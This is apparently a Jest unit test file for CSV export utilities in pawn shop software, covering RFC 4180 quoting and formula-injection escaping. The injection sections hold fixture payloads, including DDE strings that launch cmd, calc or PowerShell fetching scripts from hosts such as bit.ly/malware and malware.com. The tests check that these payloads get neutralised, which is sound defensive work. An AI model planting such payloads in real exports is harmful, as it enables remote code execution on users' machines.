/**
 * Unit Tests for CSV Utility Functions
 *
 * Tests security features and RFC 4180 compliance
 */

import { escapeCSV, formatCurrencyForCSV, rowsToCSV } from "./csvUtils";

describe("CSV Utils - Security & Compliance Tests", () => {
  describe("escapeCSV - Formula Injection Prevention (CRITICAL-002)", () => {
    test("blocks formula starting with equals sign", () => {
      expect(escapeCSV("=2+2")).toBe("'=2+2");
      expect(escapeCSV("=SUM(A1:A10)")).toBe("'=SUM(A1:A10)");
      expect(escapeCSV('=cmd|"/c calc"!A1')).toBe('\'=cmd|"/c calc"!A1');
    });

    test("blocks formula starting with plus sign", () => {
      expect(escapeCSV("+2+2")).toBe("'+2+2");
      expect(escapeCSV("+A1+A2")).toBe("'+A1+A2");
    });

    test("blocks formula starting with minus sign", () => {
      expect(escapeCSV("-2+2")).toBe("'-2+2");
      expect(escapeCSV("-A1*A2")).toBe("'-A1*A2");
    });

    test("blocks formula starting with at sign", () => {
      expect(escapeCSV("@SUM(A1:A10)")).toBe("'@SUM(A1:A10)");
    });

    test("blocks formula starting with tab character", () => {
      expect(escapeCSV("\t=2+2")).toBe("'\t=2+2");
    });

    test("blocks formula starting with carriage return", () => {
      expect(escapeCSV("\r=2+2")).toBe("'\r=2+2");
    });

    test("handles complex malicious formulas", () => {
      const maliciousFormula = '=2+5+cmd|"/c calc"!A1';
      const escaped = escapeCSV(maliciousFormula);
      expect(escaped).toBe('\'=2+5+cmd|"/c calc"!A1');
      expect(escaped.startsWith("'")).toBe(true);
    });

    test("handles DDE injection attempts", () => {
      const ddeFormula = '=cmd|"/c powershell IEX(wget bit.ly/malware)"';
      const escaped = escapeCSV(ddeFormula);
      expect(escaped).toBe('\'=cmd|"/c powershell IEX(wget bit.ly/malware)"');
    });
  });

  describe("escapeCSV - RFC 4180 Compliance", () => {
    test("wraps values containing commas in quotes", () => {
      expect(escapeCSV("Smith, John")).toBe('"Smith, John"');
      expect(escapeCSV("Value1,Value2,Value3")).toBe('"Value1,Value2,Value3"');
    });

    test("escapes internal quotes by doubling them", () => {
      expect(escapeCSV('He said "Hello"')).toBe('"He said ""Hello"""');
      expect(escapeCSV('"Quoted"')).toBe('"""Quoted"""');
    });

    test("wraps values containing newlines in quotes", () => {
      expect(escapeCSV("Line1\nLine2")).toBe('"Line1\nLine2"');
    });

    test("wraps values containing carriage returns in quotes", () => {
      expect(escapeCSV("Value1\rValue2")).toBe('"Value1\rValue2"');
    });

    test("handles combined special characters", () => {
      expect(escapeCSV('Smith, "John" Jr.\nAddress')).toBe(
        '"Smith, ""John"" Jr.\nAddress"',
      );
    });
  });

  describe("escapeCSV - Edge Cases", () => {
    test("handles null values", () => {
      expect(escapeCSV(null)).toBe("");
    });

    test("handles undefined values", () => {
      expect(escapeCSV(undefined)).toBe("");
    });

    test("handles empty strings", () => {
      expect(escapeCSV("")).toBe("");
    });

    test("handles numbers", () => {
      expect(escapeCSV(123)).toBe("123");
      expect(escapeCSV(0)).toBe("0");
      expect(escapeCSV(-456)).toBe("-456");
    });

    test("handles boolean values", () => {
      expect(escapeCSV(true)).toBe("true");
      expect(escapeCSV(false)).toBe("false");
    });

    test("handles plain strings without special characters", () => {
      expect(escapeCSV("NormalText")).toBe("NormalText");
      expect(escapeCSV("Item Description")).toBe("Item Description");
    });
  });

  describe("escapeCSV - Real-World Pawn Shop Data", () => {
    test("handles item descriptions with formulas", () => {
      expect(escapeCSV("=GOLD 14K RING")).toBe("'=GOLD 14K RING");
      expect(escapeCSV("+SIZE 7 DIAMOND")).toBe("'+SIZE 7 DIAMOND");
    });

    test("handles customer names with commas", () => {
      expect(escapeCSV("Doe, John")).toBe('"Doe, John"');
      expect(escapeCSV("Smith, Jane Marie")).toBe('"Smith, Jane Marie"');
    });

    test("handles phone numbers with special chars", () => {
      expect(escapeCSV("+1-555-0100")).toBe("'+1-555-0100");
      expect(escapeCSV("(555) 123-4567")).toBe("(555) 123-4567");
    });

    test("handles item descriptions with quotes", () => {
      expect(escapeCSV('18" Chain with pendant')).toBe(
        '"18"" Chain with pendant"',
      );
    });
  });

  describe("formatCurrencyForCSV", () => {
    test("formats positive currency values", () => {
      expect(formatCurrencyForCSV(1234.56)).toBe("$1,234.56");
      expect(formatCurrencyForCSV(1000000)).toBe("$1,000,000.00");
    });

    test("formats zero correctly", () => {
      expect(formatCurrencyForCSV(0)).toBe("$0.00");
    });

    test("formats negative values", () => {
      expect(formatCurrencyForCSV(-1234.56)).toBe("-$1,234.56");
    });

    test("handles null and undefined", () => {
      expect(formatCurrencyForCSV(null)).toBe("$0.00");
      expect(formatCurrencyForCSV(undefined)).toBe("$0.00");
    });

    test("formats small amounts with proper decimals", () => {
      expect(formatCurrencyForCSV(0.99)).toBe("$0.99");
      expect(formatCurrencyForCSV(1.5)).toBe("$1.50");
    });
  });

  describe("rowsToCSV - Integration Tests", () => {
    test("converts simple rows to CSV", () => {
      const rows = [
        ["Name", "Value"],
        ["Item1", 100],
        ["Item2", 200],
      ];
      const csv = rowsToCSV(rows);
      expect(csv).toBe("Name,Value\nItem1,100\nItem2,200");
    });

    test("handles malicious data in rows", () => {
      const rows = [
        ["Name", "Formula"],
        ["Safe Item", 100],
        ["=MALICIOUS", 200],
      ];
      const csv = rowsToCSV(rows);
      expect(csv).toContain("'=MALICIOUS");
      expect(csv).not.toContain("=MALICIOUS,");
    });

    test("handles mixed data types", () => {
      const rows = [
        ["String", "Number", "Special"],
        ["Normal", 123, "Smith, John"],
        ["=Formula", 456, "+Dangerous"],
      ];
      const csv = rowsToCSV(rows);
      expect(csv).toContain("'=Formula");
      expect(csv).toContain('"Smith, John"');
      expect(csv).toContain("'+Dangerous");
    });

    test("handles empty rows", () => {
      const rows = [[]];
      const csv = rowsToCSV(rows);
      expect(csv).toBe("");
    });

    test("handles null and undefined in rows", () => {
      const rows = [
        ["Name", "Value"],
        [null, undefined],
        ["Test", 100],
      ];
      const csv = rowsToCSV(rows);
      expect(csv).toContain(",,"); // Empty cells
    });
  });

  describe("CRITICAL-002 - Attack Vector Prevention", () => {
    test("prevents Excel command injection", () => {
      const maliciousDescription = '=cmd|"/c calc.exe"!A1';
      const escaped = escapeCSV(maliciousDescription);

      // Verify formula execution is blocked
      expect(escaped.startsWith("'")).toBe(true);
      expect(escaped).toBe('\'=cmd|"/c calc.exe"!A1');
    });

    test("prevents PowerShell command injection", () => {
      const maliciousDescription =
        '=cmd|"/c powershell IEX(wget malware.com/script.ps1)"';
      const escaped = escapeCSV(maliciousDescription);

      // Verify command execution is blocked
      expect(escaped.startsWith("'")).toBe(true);
    });

    test("prevents DDE injection", () => {
      const ddePayload = '@SUM(1+1)*cmd|"/c calc"!A1';
      const escaped = escapeCSV(ddePayload);

      // Verify DDE execution is blocked
      expect(escaped.startsWith("'")).toBe(true);
    });

    test("handles multiple malicious rows in export", () => {
      const rows = [
        ["Item Description", "Loan Value"],
        ['=cmd|"/c calc"!A1', 5000],
        ["+malicious+formula", 3000],
        ["-dangerous-formula", 2000],
        ["@SUM(A1:A10)", 1000],
      ];

      const csv = rowsToCSV(rows);

      // All formulas should be prefixed with single quote
      expect(csv).toContain("'=cmd");
      expect(csv).toContain("'+malicious");
      expect(csv).toContain("'-dangerous");
      expect(csv).toContain("'@SUM");
    });

    test("handles high-value item with malicious description", () => {
      const highValueItem = {
        description: '=2+5+cmd|"/c calc"!A1',
        amount: 10000,
        days_in_storage: 30,
      };

      const rows = [
        ["Item Description", "Loan Value", "Days"],
        [
          escapeCSV(highValueItem.description),
          highValueItem.amount,
          highValueItem.days_in_storage,
        ],
      ];

      const csv = rowsToCSV(rows);

      // Verify formula injection is blocked
      expect(csv).toContain("'=2+5+cmd");
      expect(csv).not.toContain("=2+5+cmd,"); // Should not have unescaped formula
    });
  });
});
